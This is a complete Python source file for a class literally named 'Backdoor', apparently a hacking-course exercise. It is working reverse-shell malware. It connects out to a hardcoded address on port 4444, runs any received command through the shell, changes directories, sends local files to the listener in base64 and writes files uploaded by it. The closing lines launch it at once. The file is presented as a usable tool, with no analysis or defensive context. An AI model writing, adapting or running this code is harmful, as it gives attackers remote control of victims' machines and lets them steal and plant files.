import socket
import subprocess
import json
import os
import base64


class Backdoor:
    # Set socket
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a instance of the socket
        self.connection.connect((ip, port))

    # Send data as JSON Object
    def reliable_send(self, data):
        json_data = json.dumps(data)  # Serialize data into JSON
        self.connection.send(json_data)  # Sending data to backdoor

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)  # Deserialize JSON data

    # Execute a command and return its output
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    # Change the working directory to a given path
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to: " + path

    # Read file as binary
    def read_file(self, path):
        with open(path, "rb") as file:  # "rb" stands for read binary
            # Encode the data in base64 to manage all file's types
            # by encapsulating all special characters
            return base64.b64encode(file.read())

    # Take a remote file to write on system
    def write_file(self, path, content):
        with open(path, "wb") as file:  # Write Binary file
            file.write(base64.b64decode(content))  # Decoding content encoded in Listener.read_file()
            return "[+] Upload successful"

    # Start the connection to the listener
    def run(self):
        while True:
            command = self.reliable_receive()

            try:

                # Incoming command exit
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                # Incoming command cd with path
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])

                # Incoming command download with file path
                elif command[0] == "download":
                    command_result = self.read_file(command[1])

                # Incoming upload command with file and content
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)

            except Exception:  # Except any exception error
                command_result = "[-] Error during command execution"

            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.190.140", 4444)
my_backdoor.run()
